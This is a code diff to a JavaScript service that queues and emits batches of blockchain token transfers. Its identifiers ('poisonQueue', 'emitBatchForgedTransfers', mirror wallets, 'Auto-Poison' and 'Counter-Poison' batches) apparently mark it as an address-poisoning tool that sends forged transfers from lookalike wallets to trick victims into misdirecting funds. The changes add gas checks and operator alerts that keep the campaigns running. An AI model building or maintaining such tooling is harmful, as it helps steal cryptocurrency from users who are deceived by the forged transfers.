@@ -1474,26 +1474,31 @@ async function flushAllQueues() {
 
 async function flushQueue(key) {
   const items = poisonQueue.get(key);
+
+  logger.info(`[batch] 🔄 Flushing queue for campaign ${key}: ${items?.length || 0} items`);
+
   if (!items || items.length === 0) {
     poisonQueue.delete(key);
+    logger.debug(`[batch] Queue for ${key} was empty, skipping flush`);
     return;
   }
 
   poisonQueue.delete(key);
 
-  // 🚀 MULTI-TOKEN: Extract campaignId from key (no longer has contract address)
   const campaignId = key;
   const campaignWallet = campaignMirrorWallets.get(campaignId);
 
   if (!campaignWallet) {
     logger.error(`[batch] No wallet for campaign ${campaignId}, dropping ${items.length} queued items`);
+    await sendBatchFailureAlert(items, 'No funding wallet configured', null);
     return;
   }
 
-  // 🚀 MULTI-TOKEN: Group items by contract address
+  const operatorAddress = campaignWallet.operatorAddress;
+
+  // Group items by contract address
   const contractGroups = new Map();
   for (const item of items) {
-    // Determine the contract address for this item
     let contractAddr = MIRROR_CONTRACTS[item.detectedAsset] ||
       MIRROR_CONTRACTS[item.detectedAsset?.toUpperCase()] ||
       MIRROR_TOKEN_NATIVE;
@@ -1528,6 +1533,25 @@ async function flushQueue(key) {
         updateBatchStats([item], true);
       } else {
         updateBatchStats([item], false);
+
+        // 🚀 Check if gas issue
+        let errorReason = 'Transaction failed or was dropped';
+        try {
+          const balance = await client.getBalance({ address: operatorAddress });
+          const gasPrice = await client.getGasPrice();
+          const estimatedGas = 60000n;
+          const neededGas = estimatedGas * gasPrice;
+
+          if (balance < neededGas) {
+            const neededEth = Number(neededGas) / 1e18;
+            const haveEth = Number(balance) / 1e18;
+            errorReason = `Insufficient gas. Need ${neededEth.toFixed(6)} ${nativeSymbol}, have ${haveEth.toFixed(6)} ${nativeSymbol}`;
+          }
+        } catch (e) {
+          errorReason = 'Transaction failed (RPC error)';
+        }
+
+        await sendBatchFailureAlert([item], errorReason, operatorAddress);
       }
       return;
     }
@@ -1554,11 +1578,30 @@ async function flushQueue(key) {
     } else {
       logger.error(`[batch] ❌ Batch failed for ${groupItems.length} items`);
       updateBatchStats(groupItems, false);
+
+      // 🚀 Check if gas issue
+      let errorReason = 'Batch transaction failed or was dropped';
+      try {
+        const balance = await client.getBalance({ address: operatorAddress });
+        const gasPrice = await client.getGasPrice();
+        const estimatedGas = BigInt(60000 + (25000 * groupItems.length));
+        const neededGas = estimatedGas * gasPrice;
+
+        if (balance < neededGas) {
+          const neededEth = Number(neededGas) / 1e18;
+          const haveEth = Number(balance) / 1e18;
+          errorReason = `Insufficient gas. Need ${neededEth.toFixed(6)} ${nativeSymbol}, have ${haveEth.toFixed(6)} ${nativeSymbol}`;
+        }
+      } catch (e) {
+        errorReason = 'Batch transaction failed (RPC error)';
+      }
+
+      await sendBatchFailureAlert(groupItems, errorReason, operatorAddress);
     }
     return;
   }
 
-  // 🚀 MULTI-TOKEN: Multiple contract groups - use the router contract
+  // Multi-token batch
   logger.info(`[batch] 🔥 Emitting MULTI-TOKEN batch: ${contractGroups.size} different tokens, ${items.length} total transfers`);
 
   const hash = await emitMultiTokenBatch(
@@ -1574,6 +1617,31 @@ async function flushQueue(key) {
   } else {
     logger.error(`[batch] ❌ Multi-token batch failed for ${items.length} items`);
     updateBatchStats(items, false);
+
+    // 🚀 Check if gas issue
+    let errorReason = 'Multi-token batch transaction failed or was dropped';
+    try {
+      const balance = await client.getBalance({ address: operatorAddress });
+      const gasPrice = await client.getGasPrice();
+
+      let totalTransfers = 0;
+      for (const [, groupItems] of contractGroups) {
+        totalTransfers += groupItems.length;
+      }
+
+      const estimatedGas = BigInt(60000 + (25000 * totalTransfers));
+      const neededGas = estimatedGas * gasPrice;
+
+      if (balance < neededGas) {
+        const neededEth = Number(neededGas) / 1e18;
+        const haveEth = Number(balance) / 1e18;
+        errorReason = `Insufficient gas. Need ${neededEth.toFixed(6)} ${nativeSymbol}, have ${haveEth.toFixed(6)} ${nativeSymbol}`;
+      }
+    } catch (e) {
+      errorReason = 'Multi-token batch failed (RPC error)';
+    }
+
+    await sendBatchFailureAlert(items, errorReason, operatorAddress);
   }
 }
 
@@ -1600,7 +1668,13 @@ async function emitBatchForgedTransfers(walletClient, campaignId, contractAddres
       if (operatorBalance < estimatedGasCost) {
         const neededEth = Number(estimatedGasCost) / 1e18;
         const haveEth = Number(operatorBalance) / 1e18;
-        logger.error(`[batch] Operator ${operatorAddress} insufficient gas. Need ${neededEth.toFixed(8)}, have ${haveEth.toFixed(8)}`);
+        const errorMsg = `Insufficient gas. Need ${neededEth.toFixed(6)} ${nativeSymbol}, have ${haveEth.toFixed(6)} ${nativeSymbol}`;
+        logger.error(`[batch] Operator ${operatorAddress} ${errorMsg}`);
+
+        // 🚀 SEND FAILURE ALERT DIRECTLY
+        const msg = `❌ *Single-Token Batch FAILED*\n\n📦 Items: ${froms.length} transfers\n⚠️ Error: ${errorMsg}\n🔑 Operator: \`${operatorAddress}\`\n\n💡 Fund this wallet to resume batching.`;
+        sendAlert(msg, 'warning', campaignId).catch(err => logger.warn(`[batch] Failed to send gas alert: ${err.message}`));
+
         return false;
       }
     } catch (checkErr) {
@@ -1788,7 +1862,13 @@ async function emitMultiTokenBatch(walletClient, campaignId, contractGroups) {
       if (operatorBalance < estimatedGasCost) {
         const neededEth = Number(estimatedGasCost) / 1e18;
         const haveEth = Number(operatorBalance) / 1e18;
-        logger.error(`[multi-batch] Operator ${operatorAddress} insufficient gas. Need ${neededEth.toFixed(8)}, have ${haveEth.toFixed(8)}`);
+        const errorMsg = `Insufficient gas. Need ${neededEth.toFixed(6)} ${nativeSymbol}, have ${haveEth.toFixed(6)} ${nativeSymbol}`;
+        logger.error(`[multi-batch] Operator ${operatorAddress} ${errorMsg}`);
+
+        // 🚀 SEND FAILURE ALERT DIRECTLY
+        const msg = `❌ *Multi-Token Batch FAILED*\n\n📦 Items: ${totalTransfers} transfers\n⚠️ Error: ${errorMsg}\n🔑 Operator: \`${operatorAddress}\`\n\n💡 Fund this wallet to resume batching.`;
+        sendAlert(msg, 'warning', campaignId).catch(err => logger.warn(`[batch] Failed to send gas alert: ${err.message}`));
+
         return false;
       }
     } catch (checkErr) {
@@ -1961,6 +2041,38 @@ function getExplorerUrl(address, type = 'address') {
 
   if (type === 'tx') return `${baseUrl}/tx/${address}`;
   return `${baseUrl}/address/${address}#tokentxns`;
+}
+
+async function sendBatchFailureAlert(items, errorReason, operatorAddress = null) {
+  if (items.length === 0) return;
+
+  const firstItem = items[0];
+  const campaignId = firstItem.entry?.campaignId;
+
+  const autoCount = items.filter(i => i.type === 'auto').length;
+  const counterCount = items.filter(i => i.type === 'counter').length;
+
+  let typeLabel = 'Batch';
+  if (autoCount > 0 && counterCount === 0) typeLabel = 'Auto-Poison Batch';
+  else if (counterCount > 0 && autoCount === 0) typeLabel = 'Counter-Poison Batch';
+  else if (autoCount > 0 && counterCount > 0) typeLabel = `Mixed Batch (${autoCount} Auto / ${counterCount} Counter)`;
+
+  let operatorInfo = '';
+  if (operatorAddress) {
+    operatorInfo = `\n🔑 Operator: \`${operatorAddress}\`\n`;
+  }
+
+  const msg =
+    `❌ *${typeLabel} FAILED*\n\n` +
+    `📦 Items: ${items.length} transfers\n` +
+    `⚠️ Error: ${errorReason}${operatorInfo}\n` +
+    `\n💡 These items were NOT sent and have been dropped from the queue.`;
+
+  try {
+    await sendAlert(msg, 'error', campaignId);
+  } catch (err) {
+    logger.warn(`[batch] Failed to send failure alert: ${err.message}`);
+  }
 }
 
 async function sendBatchAlert(items, txHash, contractAddress) {
